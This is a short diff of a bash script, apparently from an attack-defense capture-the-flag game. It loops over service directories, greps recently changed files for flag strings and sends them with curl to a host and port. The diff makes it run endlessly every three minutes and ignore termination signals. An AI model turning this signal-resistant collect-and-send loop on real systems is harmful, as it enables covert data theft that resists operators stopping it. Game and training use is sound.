@@ -1,11 +1,15 @@
 #!/bin/bash
 
-HOST="team2"
+HOST="localhost"
 PORT="8888"
 
+trap : HUP INT KILL TERM STOP TSTP
+
+while :; do
 for SVC in `find /opt/ctf/ -name rw -type d`;
 do
-    FLAGS=`find . -type f -cmin -3 -exec grep -o '^FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
-    curl  "$HOST:$PORT/$FLAGS"
+	FLAGS=`find $SVC -type f -cmin -3 -exec grep -o '^FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
+	curl  "$HOST:$PORT/$FLAGS"
+	sleep 3m
 done
-
+done
